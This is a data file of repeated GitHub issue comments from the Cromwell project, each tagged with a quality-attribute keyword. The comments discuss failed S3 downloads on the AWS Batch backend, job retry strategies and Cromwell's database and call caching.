https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-710428780:2512,Availability,down,downloads,2512,"two in the JIRA issue tracker back in August.; > Reposting here since it didn't get a response over there:; > https://broadworkbench.atlassian.net/browse/BA-6548; >; > Hello everyone,; >; > I am attempting to use the AWS Batch backend for Cromwell to run a wdl; > script which runs several subjobs in parallel. I believe the correct; > parlance is a scatter. I noticed that in some of the jobs of the scatter,; > some reference files failed to download from S3 even though they existed; > (Connection Reset by Peer). This failure caused the overall job to fail; > after one hour of running.; >; > I believe this issue was reported and fixed before, around May 2019, but; > recently, in June 2020, it appears the AWS Batch backend was majorly; > overhauled (by @markjschreiber <https://github.com/markjschreiber>,; > thanks! Also, tagging you because I suspect you might be the resident; > expert here :) ), and the previous fix (using the ecs proxy image) was; > supposedly obsoleted.; >; > I also see that the s3fs library appears to be vendored into cromwell, and; > after digging around, it appears that one might be able to set retries via; > an environment variable(?). But even then, I feel like if that were to; > work, it would be much nicer if it was configurable through cromwell's; > config file somehow.; >; > So that brings me to my final question. Is there some configuration that; > allows me to retry failed downloads some number of times before failing the; > whole job? Or, perhap there is some alternative configuraiton which I've; > overlooked and someone could point me to it? Thanks!; >; > In addition, just wondering if perhaps there is a service limit I might be; > running into?; >; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/5946>, or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AF2E6ENB62FDV4UVUUQGAE3SKXWAPANCNFSM4SQ7HRGQ>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-710428780
https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-710428780:2464,Deployability,configurat,configuration,2464,"two in the JIRA issue tracker back in August.; > Reposting here since it didn't get a response over there:; > https://broadworkbench.atlassian.net/browse/BA-6548; >; > Hello everyone,; >; > I am attempting to use the AWS Batch backend for Cromwell to run a wdl; > script which runs several subjobs in parallel. I believe the correct; > parlance is a scatter. I noticed that in some of the jobs of the scatter,; > some reference files failed to download from S3 even though they existed; > (Connection Reset by Peer). This failure caused the overall job to fail; > after one hour of running.; >; > I believe this issue was reported and fixed before, around May 2019, but; > recently, in June 2020, it appears the AWS Batch backend was majorly; > overhauled (by @markjschreiber <https://github.com/markjschreiber>,; > thanks! Also, tagging you because I suspect you might be the resident; > expert here :) ), and the previous fix (using the ecs proxy image) was; > supposedly obsoleted.; >; > I also see that the s3fs library appears to be vendored into cromwell, and; > after digging around, it appears that one might be able to set retries via; > an environment variable(?). But even then, I feel like if that were to; > work, it would be much nicer if it was configurable through cromwell's; > config file somehow.; >; > So that brings me to my final question. Is there some configuration that; > allows me to retry failed downloads some number of times before failing the; > whole job? Or, perhap there is some alternative configuraiton which I've; > overlooked and someone could point me to it? Thanks!; >; > In addition, just wondering if perhaps there is a service limit I might be; > running into?; >; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/5946>, or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AF2E6ENB62FDV4UVUUQGAE3SKXWAPANCNFSM4SQ7HRGQ>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-710428780
https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-710428780:2250,Modifiability,variab,variable,2250,"two in the JIRA issue tracker back in August.; > Reposting here since it didn't get a response over there:; > https://broadworkbench.atlassian.net/browse/BA-6548; >; > Hello everyone,; >; > I am attempting to use the AWS Batch backend for Cromwell to run a wdl; > script which runs several subjobs in parallel. I believe the correct; > parlance is a scatter. I noticed that in some of the jobs of the scatter,; > some reference files failed to download from S3 even though they existed; > (Connection Reset by Peer). This failure caused the overall job to fail; > after one hour of running.; >; > I believe this issue was reported and fixed before, around May 2019, but; > recently, in June 2020, it appears the AWS Batch backend was majorly; > overhauled (by @markjschreiber <https://github.com/markjschreiber>,; > thanks! Also, tagging you because I suspect you might be the resident; > expert here :) ), and the previous fix (using the ecs proxy image) was; > supposedly obsoleted.; >; > I also see that the s3fs library appears to be vendored into cromwell, and; > after digging around, it appears that one might be able to set retries via; > an environment variable(?). But even then, I feel like if that were to; > work, it would be much nicer if it was configurable through cromwell's; > config file somehow.; >; > So that brings me to my final question. Is there some configuration that; > allows me to retry failed downloads some number of times before failing the; > whole job? Or, perhap there is some alternative configuraiton which I've; > overlooked and someone could point me to it? Thanks!; >; > In addition, just wondering if perhaps there is a service limit I might be; > running into?; >; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/5946>, or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AF2E6ENB62FDV4UVUUQGAE3SKXWAPANCNFSM4SQ7HRGQ>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-710428780
https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-710428780:2348,Modifiability,config,configurable,2348,"two in the JIRA issue tracker back in August.; > Reposting here since it didn't get a response over there:; > https://broadworkbench.atlassian.net/browse/BA-6548; >; > Hello everyone,; >; > I am attempting to use the AWS Batch backend for Cromwell to run a wdl; > script which runs several subjobs in parallel. I believe the correct; > parlance is a scatter. I noticed that in some of the jobs of the scatter,; > some reference files failed to download from S3 even though they existed; > (Connection Reset by Peer). This failure caused the overall job to fail; > after one hour of running.; >; > I believe this issue was reported and fixed before, around May 2019, but; > recently, in June 2020, it appears the AWS Batch backend was majorly; > overhauled (by @markjschreiber <https://github.com/markjschreiber>,; > thanks! Also, tagging you because I suspect you might be the resident; > expert here :) ), and the previous fix (using the ecs proxy image) was; > supposedly obsoleted.; >; > I also see that the s3fs library appears to be vendored into cromwell, and; > after digging around, it appears that one might be able to set retries via; > an environment variable(?). But even then, I feel like if that were to; > work, it would be much nicer if it was configurable through cromwell's; > config file somehow.; >; > So that brings me to my final question. Is there some configuration that; > allows me to retry failed downloads some number of times before failing the; > whole job? Or, perhap there is some alternative configuraiton which I've; > overlooked and someone could point me to it? Thanks!; >; > In addition, just wondering if perhaps there is a service limit I might be; > running into?; >; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/5946>, or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AF2E6ENB62FDV4UVUUQGAE3SKXWAPANCNFSM4SQ7HRGQ>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-710428780
https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-710428780:2383,Modifiability,config,config,2383,"two in the JIRA issue tracker back in August.; > Reposting here since it didn't get a response over there:; > https://broadworkbench.atlassian.net/browse/BA-6548; >; > Hello everyone,; >; > I am attempting to use the AWS Batch backend for Cromwell to run a wdl; > script which runs several subjobs in parallel. I believe the correct; > parlance is a scatter. I noticed that in some of the jobs of the scatter,; > some reference files failed to download from S3 even though they existed; > (Connection Reset by Peer). This failure caused the overall job to fail; > after one hour of running.; >; > I believe this issue was reported and fixed before, around May 2019, but; > recently, in June 2020, it appears the AWS Batch backend was majorly; > overhauled (by @markjschreiber <https://github.com/markjschreiber>,; > thanks! Also, tagging you because I suspect you might be the resident; > expert here :) ), and the previous fix (using the ecs proxy image) was; > supposedly obsoleted.; >; > I also see that the s3fs library appears to be vendored into cromwell, and; > after digging around, it appears that one might be able to set retries via; > an environment variable(?). But even then, I feel like if that were to; > work, it would be much nicer if it was configurable through cromwell's; > config file somehow.; >; > So that brings me to my final question. Is there some configuration that; > allows me to retry failed downloads some number of times before failing the; > whole job? Or, perhap there is some alternative configuraiton which I've; > overlooked and someone could point me to it? Thanks!; >; > In addition, just wondering if perhaps there is a service limit I might be; > running into?; >; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/5946>, or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AF2E6ENB62FDV4UVUUQGAE3SKXWAPANCNFSM4SQ7HRGQ>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-710428780
https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-710428780:2464,Modifiability,config,configuration,2464,"two in the JIRA issue tracker back in August.; > Reposting here since it didn't get a response over there:; > https://broadworkbench.atlassian.net/browse/BA-6548; >; > Hello everyone,; >; > I am attempting to use the AWS Batch backend for Cromwell to run a wdl; > script which runs several subjobs in parallel. I believe the correct; > parlance is a scatter. I noticed that in some of the jobs of the scatter,; > some reference files failed to download from S3 even though they existed; > (Connection Reset by Peer). This failure caused the overall job to fail; > after one hour of running.; >; > I believe this issue was reported and fixed before, around May 2019, but; > recently, in June 2020, it appears the AWS Batch backend was majorly; > overhauled (by @markjschreiber <https://github.com/markjschreiber>,; > thanks! Also, tagging you because I suspect you might be the resident; > expert here :) ), and the previous fix (using the ecs proxy image) was; > supposedly obsoleted.; >; > I also see that the s3fs library appears to be vendored into cromwell, and; > after digging around, it appears that one might be able to set retries via; > an environment variable(?). But even then, I feel like if that were to; > work, it would be much nicer if it was configurable through cromwell's; > config file somehow.; >; > So that brings me to my final question. Is there some configuration that; > allows me to retry failed downloads some number of times before failing the; > whole job? Or, perhap there is some alternative configuraiton which I've; > overlooked and someone could point me to it? Thanks!; >; > In addition, just wondering if perhaps there is a service limit I might be; > running into?; >; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/5946>, or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AF2E6ENB62FDV4UVUUQGAE3SKXWAPANCNFSM4SQ7HRGQ>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-710428780
https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-710428780:2613,Modifiability,config,configuraiton,2613,"two in the JIRA issue tracker back in August.; > Reposting here since it didn't get a response over there:; > https://broadworkbench.atlassian.net/browse/BA-6548; >; > Hello everyone,; >; > I am attempting to use the AWS Batch backend for Cromwell to run a wdl; > script which runs several subjobs in parallel. I believe the correct; > parlance is a scatter. I noticed that in some of the jobs of the scatter,; > some reference files failed to download from S3 even though they existed; > (Connection Reset by Peer). This failure caused the overall job to fail; > after one hour of running.; >; > I believe this issue was reported and fixed before, around May 2019, but; > recently, in June 2020, it appears the AWS Batch backend was majorly; > overhauled (by @markjschreiber <https://github.com/markjschreiber>,; > thanks! Also, tagging you because I suspect you might be the resident; > expert here :) ), and the previous fix (using the ecs proxy image) was; > supposedly obsoleted.; >; > I also see that the s3fs library appears to be vendored into cromwell, and; > after digging around, it appears that one might be able to set retries via; > an environment variable(?). But even then, I feel like if that were to; > work, it would be much nicer if it was configurable through cromwell's; > config file somehow.; >; > So that brings me to my final question. Is there some configuration that; > allows me to retry failed downloads some number of times before failing the; > whole job? Or, perhap there is some alternative configuraiton which I've; > overlooked and someone could point me to it? Thanks!; >; > In addition, just wondering if perhaps there is a service limit I might be; > running into?; >; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/5946>, or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AF2E6ENB62FDV4UVUUQGAE3SKXWAPANCNFSM4SQ7HRGQ>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-710428780
https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-710428780:770,Safety,recover,recovery,770,"There is a Pull request in for AWS CLI call retry's which will mitigate; some of the problem. Currently full retries of tasks are not supported via; Cromwell Server coordinating with the AWS Batch backend. Having said that,; you could identify the AWS Batch Job Description and edit it to create a; new revision such that the revision uses the AWS Batch retry strategy. This; will mean that AWS Batch will retry any job that doesn't exit cleanly; (return code 0 or container host is terminated) up to a max number of; times. When that happens, the job ID remains the same so as far as Cromwell; knows it is the same job. I haven't had a chance to test this out myself; but it's on my to do list. Let me know if you try it. If it works the same; approach would allow for recovery in the case of Spot interruption. https://docs.aws.amazon.com/batch/latest/userguide/job_retries.html; https://docs.aws.amazon.com/batch/latest/userguide/job_definition_parameters.html#retryStrategy. On Wed, Oct 14, 2020 at 2:40 PM Richard Davison <notifications@github.com>; wrote:. > Originally posted this two in the JIRA issue tracker back in August.; > Reposting here since it didn't get a response over there:; > https://broadworkbench.atlassian.net/browse/BA-6548; >; > Hello everyone,; >; > I am attempting to use the AWS Batch backend for Cromwell to run a wdl; > script which runs several subjobs in parallel. I believe the correct; > parlance is a scatter. I noticed that in some of the jobs of the scatter,; > some reference files failed to download from S3 even though they existed; > (Connection Reset by Peer). This failure caused the overall job to fail; > after one hour of running.; >; > I believe this issue was reported and fixed before, around May 2019, but; > recently, in June 2020, it appears the AWS Batch backend was majorly; > overhauled (by @markjschreiber <https://github.com/markjschreiber>,; > thanks! Also, tagging you because I suspect you might be the resident; > expert here :) ), and th",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-710428780
https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-710428780:647,Testability,test,test,647,"There is a Pull request in for AWS CLI call retry's which will mitigate; some of the problem. Currently full retries of tasks are not supported via; Cromwell Server coordinating with the AWS Batch backend. Having said that,; you could identify the AWS Batch Job Description and edit it to create a; new revision such that the revision uses the AWS Batch retry strategy. This; will mean that AWS Batch will retry any job that doesn't exit cleanly; (return code 0 or container host is terminated) up to a max number of; times. When that happens, the job ID remains the same so as far as Cromwell; knows it is the same job. I haven't had a chance to test this out myself; but it's on my to do list. Let me know if you try it. If it works the same; approach would allow for recovery in the case of Spot interruption. https://docs.aws.amazon.com/batch/latest/userguide/job_retries.html; https://docs.aws.amazon.com/batch/latest/userguide/job_definition_parameters.html#retryStrategy. On Wed, Oct 14, 2020 at 2:40 PM Richard Davison <notifications@github.com>; wrote:. > Originally posted this two in the JIRA issue tracker back in August.; > Reposting here since it didn't get a response over there:; > https://broadworkbench.atlassian.net/browse/BA-6548; >; > Hello everyone,; >; > I am attempting to use the AWS Batch backend for Cromwell to run a wdl; > script which runs several subjobs in parallel. I believe the correct; > parlance is a scatter. I noticed that in some of the jobs of the scatter,; > some reference files failed to download from S3 even though they existed; > (Connection Reset by Peer). This failure caused the overall job to fail; > after one hour of running.; >; > I believe this issue was reported and fixed before, around May 2019, but; > recently, in June 2020, it appears the AWS Batch backend was majorly; > overhauled (by @markjschreiber <https://github.com/markjschreiber>,; > thanks! Also, tagging you because I suspect you might be the resident; > expert here :) ), and th",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-710428780
https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-729517775:162,Deployability,update,update,162,"@markjschreiber . I tested your theory, and while the job was able to complete successfully the second time around (after changing the job definition), it didn't update the status in the Cromwell database. Do you reckon it should be possible for me to manually change a record in the database in order to get cromwell to continue where it left off, or will I need to resubmit the entire workflow, and hope that CallCaching is working?. In this particular workflow I'm running, I've observed that CallCaching works.... sometimes(?).... but I was surprised by the amount of Cache misses I observed, which I'm not really sure how to troubleshoot.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-729517775
https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-729517775:572,Performance,Cache,Cache,572,"@markjschreiber . I tested your theory, and while the job was able to complete successfully the second time around (after changing the job definition), it didn't update the status in the Cromwell database. Do you reckon it should be possible for me to manually change a record in the database in order to get cromwell to continue where it left off, or will I need to resubmit the entire workflow, and hope that CallCaching is working?. In this particular workflow I'm running, I've observed that CallCaching works.... sometimes(?).... but I was surprised by the amount of Cache misses I observed, which I'm not really sure how to troubleshoot.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-729517775
https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-729517775:20,Testability,test,tested,20,"@markjschreiber . I tested your theory, and while the job was able to complete successfully the second time around (after changing the job definition), it didn't update the status in the Cromwell database. Do you reckon it should be possible for me to manually change a record in the database in order to get cromwell to continue where it left off, or will I need to resubmit the entire workflow, and hope that CallCaching is working?. In this particular workflow I'm running, I've observed that CallCaching works.... sometimes(?).... but I was surprised by the amount of Cache misses I observed, which I'm not really sure how to troubleshoot.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-729517775
https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-730224182:47,Availability,failure,failure,47,"When does the database get notified of a job's failure?; - the moment the job fails. or. - when AWS Batch finally gives up trying to run the job. I'm asking because from what I can tell, once a workflow is in a terminal state, some records are deleted from the database, which means that it would be impossible to try to run a job in a failed state. This is precisely what I tested: I navigated to the failed job in AWS Batch, and then pressed the ""Clone Job"" button. Perhaps a better test would be to literally create a new Job Description revision (as you pointed out earlier) to see if a failed attempt can be rerun without impacting the status of the workflow. As for my current situation, it seems I'm SOL, and just have to bit the bullet and resubmit the entire workflow and cross my fingers for Call Caching to work. (just for the record, I installed cromwell by following the instructions from here https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-716229310 )",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-730224182
https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-730224182:848,Deployability,install,installed,848,"When does the database get notified of a job's failure?; - the moment the job fails. or. - when AWS Batch finally gives up trying to run the job. I'm asking because from what I can tell, once a workflow is in a terminal state, some records are deleted from the database, which means that it would be impossible to try to run a job in a failed state. This is precisely what I tested: I navigated to the failed job in AWS Batch, and then pressed the ""Clone Job"" button. Perhaps a better test would be to literally create a new Job Description revision (as you pointed out earlier) to see if a failed attempt can be rerun without impacting the status of the workflow. As for my current situation, it seems I'm SOL, and just have to bit the bullet and resubmit the entire workflow and cross my fingers for Call Caching to work. (just for the record, I installed cromwell by following the instructions from here https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-716229310 )",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-730224182
https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-730224182:375,Testability,test,tested,375,"When does the database get notified of a job's failure?; - the moment the job fails. or. - when AWS Batch finally gives up trying to run the job. I'm asking because from what I can tell, once a workflow is in a terminal state, some records are deleted from the database, which means that it would be impossible to try to run a job in a failed state. This is precisely what I tested: I navigated to the failed job in AWS Batch, and then pressed the ""Clone Job"" button. Perhaps a better test would be to literally create a new Job Description revision (as you pointed out earlier) to see if a failed attempt can be rerun without impacting the status of the workflow. As for my current situation, it seems I'm SOL, and just have to bit the bullet and resubmit the entire workflow and cross my fingers for Call Caching to work. (just for the record, I installed cromwell by following the instructions from here https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-716229310 )",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-730224182
https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-730224182:485,Testability,test,test,485,"When does the database get notified of a job's failure?; - the moment the job fails. or. - when AWS Batch finally gives up trying to run the job. I'm asking because from what I can tell, once a workflow is in a terminal state, some records are deleted from the database, which means that it would be impossible to try to run a job in a failed state. This is precisely what I tested: I navigated to the failed job in AWS Batch, and then pressed the ""Clone Job"" button. Perhaps a better test would be to literally create a new Job Description revision (as you pointed out earlier) to see if a failed attempt can be rerun without impacting the status of the workflow. As for my current situation, it seems I'm SOL, and just have to bit the bullet and resubmit the entire workflow and cross my fingers for Call Caching to work. (just for the record, I installed cromwell by following the instructions from here https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-716229310 )",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-730224182
https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-730462165:226,Availability,failure,failure,226,"Hi Richard,. The Cromwell server is responsible for updating the database. The general; flow of information is AWS Batch -> Cromwell AWS Batch Backend Module ->; Cromwell Metadata actor -> DB. Cromwell only becomes aware of a failure if AWS Batch Backend Module; detects a failure in Batch (usually a non zero return code for the job). I; haven't tested it but I think if you define a retry strategy in the job; definition then Cromwell will not even be aware of the retry unless all of; the retries fail. Any or all of the Metadata entries in the database can be deleted if you; observe weird caching behavior. You can even drop the whole DB and the; Cromwell server will regenerate it the next time it starts. On Thu, Nov 19, 2020 at 3:51 AM Richard Davison <notifications@github.com>; wrote:. > When does the database get notified of a job's failure?; >; > - the moment the job fails; >; > or; >; > - when AWS Batch finally gives up trying to run the job; >; > I'm asking because from what I can tell, once a workflow is in a terminal; > state, some records are deleted from the database, which means that it; > would be impossible to try to run a job in a failed state. This is; > precisely what I tested: I navigated to the failed job in AWS Batch, and; > then pressed the ""Clone Job"" button.; >; > Perhaps a better test would be to literally create a new Job Description; > revision (as you pointed out earlier) to see if Batch a failed attempt can; > be rerun without impacting the status of the workflow.; >; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-730224182>,; > or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AF2E6EJLBXTJDA4SKYT4Y43SQTMADANCNFSM4SQ7HRGQ>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-730462165
https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-730462165:273,Availability,failure,failure,273,"Hi Richard,. The Cromwell server is responsible for updating the database. The general; flow of information is AWS Batch -> Cromwell AWS Batch Backend Module ->; Cromwell Metadata actor -> DB. Cromwell only becomes aware of a failure if AWS Batch Backend Module; detects a failure in Batch (usually a non zero return code for the job). I; haven't tested it but I think if you define a retry strategy in the job; definition then Cromwell will not even be aware of the retry unless all of; the retries fail. Any or all of the Metadata entries in the database can be deleted if you; observe weird caching behavior. You can even drop the whole DB and the; Cromwell server will regenerate it the next time it starts. On Thu, Nov 19, 2020 at 3:51 AM Richard Davison <notifications@github.com>; wrote:. > When does the database get notified of a job's failure?; >; > - the moment the job fails; >; > or; >; > - when AWS Batch finally gives up trying to run the job; >; > I'm asking because from what I can tell, once a workflow is in a terminal; > state, some records are deleted from the database, which means that it; > would be impossible to try to run a job in a failed state. This is; > precisely what I tested: I navigated to the failed job in AWS Batch, and; > then pressed the ""Clone Job"" button.; >; > Perhaps a better test would be to literally create a new Job Description; > revision (as you pointed out earlier) to see if Batch a failed attempt can; > be rerun without impacting the status of the workflow.; >; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-730224182>,; > or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AF2E6EJLBXTJDA4SKYT4Y43SQTMADANCNFSM4SQ7HRGQ>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-730462165
https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-730462165:845,Availability,failure,failure,845,"Hi Richard,. The Cromwell server is responsible for updating the database. The general; flow of information is AWS Batch -> Cromwell AWS Batch Backend Module ->; Cromwell Metadata actor -> DB. Cromwell only becomes aware of a failure if AWS Batch Backend Module; detects a failure in Batch (usually a non zero return code for the job). I; haven't tested it but I think if you define a retry strategy in the job; definition then Cromwell will not even be aware of the retry unless all of; the retries fail. Any or all of the Metadata entries in the database can be deleted if you; observe weird caching behavior. You can even drop the whole DB and the; Cromwell server will regenerate it the next time it starts. On Thu, Nov 19, 2020 at 3:51 AM Richard Davison <notifications@github.com>; wrote:. > When does the database get notified of a job's failure?; >; > - the moment the job fails; >; > or; >; > - when AWS Batch finally gives up trying to run the job; >; > I'm asking because from what I can tell, once a workflow is in a terminal; > state, some records are deleted from the database, which means that it; > would be impossible to try to run a job in a failed state. This is; > precisely what I tested: I navigated to the failed job in AWS Batch, and; > then pressed the ""Clone Job"" button.; >; > Perhaps a better test would be to literally create a new Job Description; > revision (as you pointed out earlier) to see if Batch a failed attempt can; > be rerun without impacting the status of the workflow.; >; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-730224182>,; > or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AF2E6EJLBXTJDA4SKYT4Y43SQTMADANCNFSM4SQ7HRGQ>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-730462165
https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-730462165:263,Safety,detect,detects,263,"Hi Richard,. The Cromwell server is responsible for updating the database. The general; flow of information is AWS Batch -> Cromwell AWS Batch Backend Module ->; Cromwell Metadata actor -> DB. Cromwell only becomes aware of a failure if AWS Batch Backend Module; detects a failure in Batch (usually a non zero return code for the job). I; haven't tested it but I think if you define a retry strategy in the job; definition then Cromwell will not even be aware of the retry unless all of; the retries fail. Any or all of the Metadata entries in the database can be deleted if you; observe weird caching behavior. You can even drop the whole DB and the; Cromwell server will regenerate it the next time it starts. On Thu, Nov 19, 2020 at 3:51 AM Richard Davison <notifications@github.com>; wrote:. > When does the database get notified of a job's failure?; >; > - the moment the job fails; >; > or; >; > - when AWS Batch finally gives up trying to run the job; >; > I'm asking because from what I can tell, once a workflow is in a terminal; > state, some records are deleted from the database, which means that it; > would be impossible to try to run a job in a failed state. This is; > precisely what I tested: I navigated to the failed job in AWS Batch, and; > then pressed the ""Clone Job"" button.; >; > Perhaps a better test would be to literally create a new Job Description; > revision (as you pointed out earlier) to see if Batch a failed attempt can; > be rerun without impacting the status of the workflow.; >; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-730224182>,; > or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AF2E6EJLBXTJDA4SKYT4Y43SQTMADANCNFSM4SQ7HRGQ>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-730462165
https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-730462165:347,Testability,test,tested,347,"Hi Richard,. The Cromwell server is responsible for updating the database. The general; flow of information is AWS Batch -> Cromwell AWS Batch Backend Module ->; Cromwell Metadata actor -> DB. Cromwell only becomes aware of a failure if AWS Batch Backend Module; detects a failure in Batch (usually a non zero return code for the job). I; haven't tested it but I think if you define a retry strategy in the job; definition then Cromwell will not even be aware of the retry unless all of; the retries fail. Any or all of the Metadata entries in the database can be deleted if you; observe weird caching behavior. You can even drop the whole DB and the; Cromwell server will regenerate it the next time it starts. On Thu, Nov 19, 2020 at 3:51 AM Richard Davison <notifications@github.com>; wrote:. > When does the database get notified of a job's failure?; >; > - the moment the job fails; >; > or; >; > - when AWS Batch finally gives up trying to run the job; >; > I'm asking because from what I can tell, once a workflow is in a terminal; > state, some records are deleted from the database, which means that it; > would be impossible to try to run a job in a failed state. This is; > precisely what I tested: I navigated to the failed job in AWS Batch, and; > then pressed the ""Clone Job"" button.; >; > Perhaps a better test would be to literally create a new Job Description; > revision (as you pointed out earlier) to see if Batch a failed attempt can; > be rerun without impacting the status of the workflow.; >; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-730224182>,; > or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AF2E6EJLBXTJDA4SKYT4Y43SQTMADANCNFSM4SQ7HRGQ>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-730462165
